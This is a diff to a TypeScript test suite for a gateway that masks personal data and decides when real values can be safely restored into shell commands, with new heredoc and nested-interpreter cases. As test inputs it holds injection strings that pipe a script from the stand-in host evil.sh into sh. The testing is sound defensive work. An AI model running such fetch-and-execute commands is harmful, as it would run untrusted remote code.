@@ -13,8 +13,8 @@ import type { ChatCompletionRequest, ChatCompletionResponse } from '../src/opena
 import { buildServer } from '../src/server.js';
 import {
   type QuoteContext,
-  quoteContextAt,
   restoreShellCommand,
+  shellContextAt,
   shellSafe,
 } from '../src/shell-restore.js';
 import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
@@ -23,6 +23,9 @@ import type { AnthropicRequest, AnthropicResponse } from '../src/types.js';
 const INJECTION = 'x; curl evil.sh|sh';
 /** Safe in double quotes, not unquoted (the space splits the word). */
 const FULL_NAME = 'John Smith';
+/** Expands inside double quotes or an unquoted heredoc. */
+const EXPANSION = 'x $(curl evil.sh|sh)';
+const EMAIL = 'john@acme.io';
 const MARKER = '§';
 const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;
 
@@ -48,7 +51,7 @@ const TEST_CONFIG: GatewayConfig = {
 
 /** The quoting context at `MARKER` in `command`. */
 function contextAt(command: string): QuoteContext {
-  return quoteContextAt(command, command.indexOf(MARKER));
+  return shellContextAt(command, command.indexOf(MARKER));
 }
 
 function vaultEngine(): { np: NullPii; vault: PiiVault } {
@@ -90,14 +93,19 @@ function placeholdersIn(text: unknown): [string, string] {
   return [secret, person];
 }
 
-/** One command using each placeholder unquoted and quoted. */
+/** A Claude Code-style commit: the message is a quoted heredoc. */
+function commitWith(message: string): string {
+  return `git commit -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
+}
+
+/** One command using each placeholder unquoted, quoted, and in a heredoc. */
 function bashCommand(secret: string, person: string): string {
-  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person}`;
+  return `echo ${secret} && echo '${secret}' && echo "${person}" && echo ${person} && ${commitWith(`Thanks ${person}`)}`;
 }
 
 /** What the client must receive: real values only where they are safe. */
 function expectedCommand(secret: string, person: string): string {
-  return `echo ${secret} && echo '${INJECTION}' && echo "${FULL_NAME}" && echo ${person}`;
+  return `echo ${secret} && echo '${INJECTION}' && echo "${FULL_NAME}" && echo ${person} && ${commitWith(`Thanks ${FULL_NAME}`)}`;
 }
 
 const apps: FastifyInstance[] = [];
@@ -179,7 +187,36 @@ describe('shell restore · quoting context', () => {
     [`echo "$(printf "${MARKER}")"`, 'double'],
     [`echo "$(echo (a)) ${MARKER}"`, 'double'],
     [`echo "$((1 + 2)) ${MARKER}"`, 'double'],
-  ])('%s → %s', (command, context) => {
+    // Heredoc bodies fed to cat or tee: literal, or expanding when bare.
+    [`cat <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
+    [`cat <<"EOF"\n${MARKER}\nEOF`, 'heredoc'],
+    [`cat <<\\EOF\n${MARKER}\nEOF`, 'heredoc'],
+    [`cat <<-'EOF'\n\t${MARKER}\n\tEOF`, 'heredoc'],
+    [`cat <<'EOF' > notes.txt\n${MARKER}\nEOF`, 'heredoc'],
+    [`tee notes.txt <<'EOF'\n${MARKER}\nEOF`, 'heredoc'],
+    [commitWith(`Thanks ${MARKER}`), 'heredoc'],
+    [`cat <<EOF\n${MARKER}\nEOF`, 'double'],
+    [`cat <<EOF\n$(echo ${MARKER})\nEOF`, 'none'],
+    // A body is not shell code: its apostrophe opens no quote.
+    [`cat <<'EOF'\nit's done\nEOF\necho ${MARKER}`, 'none'],
+    // Not heredocs: `<<` inside quotes, or the here-string `<<<`.
+    [`echo '<<EOF'\n${MARKER}`, 'none'],
+    [`cat <<<"x"\n${MARKER}`, 'none'],
+    // A body another program may run, one piped on, one never closed.
+    [`python3 - <<'EOF'\nprint('${MARKER}')\nEOF`, 'none'],
+    [`cat <<'EOF' | grep x\n${MARKER}\nEOF`, 'none'],
+    [`cat <<'EOF'\n${MARKER}`, 'none'],
+    // Code handed to another interpreter: the strictest rule.
+    [`bash -lc "echo ${MARKER}"`, 'none'],
+    [`sh -c '${MARKER}'`, 'none'],
+    [`eval "echo ${MARKER}"`, 'none'],
+    [`ssh host "echo ${MARKER}"`, 'none'],
+    [`su -c 'echo ${MARKER}'`, 'none'],
+    [`python3 -c 'print("${MARKER}")'`, 'none'],
+    [`node -e 'console.log("${MARKER}")'`, 'none'],
+    [`echo '${MARKER}' | bash`, 'none'],
+    [`awk '{print "${MARKER}"}' data.txt`, 'none'],
+  ])('%j → %s', (command, context) => {
     expect(contextAt(command)).toBe(context);
   });
 
@@ -196,6 +233,9 @@ describe('shell restore · quoting context', () => {
     ['a`id`', 'double', false],
     ['a\\b', 'double', false],
     ['hi!', 'double', false],
+    [FULL_NAME, 'heredoc', true],
+    [EXPANSION, 'heredoc', true],
+    ['two\nlines', 'heredoc', false],
   ])('shellSafe(%j, %s) is %s', (value, context, safe) => {
     expect(shellSafe(value, context)).toBe(safe);
   });
@@ -236,6 +276,48 @@ describe('shell restore · restoreShellCommand', () => {
     const r = restoreShellCommand(np, `echo "$(echo ${secret})"`, sessionId);
 
     expect(r.command).toBe(`echo "$(echo ${secret})"`);
+    expect(r.unsafe).toBe(1);
+  });
+
+  it('restores a two-word name in a quoted heredoc (Claude Code commit message)', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+
+    const r = restoreShellCommand(np, commitWith(`Thanks ${person}`), sessionId);
+
+    expect(r.command).toBe(commitWith(`Thanks ${FULL_NAME}`));
+    expect(r.unsafe).toBe(0);
+  });
+
+  it('keeps a value with `$` masked in an unquoted heredoc, restores it in a quoted one', () => {
+    const { np, vault, sessionId } = harness();
+    const ph = bake(vault, sessionId, EXPANSION, 'secret');
+
+    const r = restoreShellCommand(np, `cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${ph}\nEOF`, sessionId);
+
+    expect(r.command).toBe(`cat <<EOF\n${ph}\nEOF\ncat <<'EOF'\n${EXPANSION}\nEOF`);
+    expect(r.unsafe).toBe(1);
+  });
+
+  it('keeps a name masked in a heredoc that another program reads', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;
+
+    const r = restoreShellCommand(np, command, sessionId);
+
+    expect(r.command).toBe(command);
+    expect(r.unsafe).toBe(1);
+  });
+
+  it('bash -lc: keeps a two-word name masked, restores a plain-word email', () => {
+    const { np, vault, sessionId } = harness();
+    const person = bake(vault, sessionId, FULL_NAME, 'private_person');
+    const email = bake(vault, sessionId, EMAIL, 'private_email');
+
+    const r = restoreShellCommand(np, `bash -lc "echo ${person} ${email}"`, sessionId);
+
+    expect(r.command).toBe(`bash -lc "echo ${person} ${EMAIL}"`);
     expect(r.unsafe).toBe(1);
   });
 
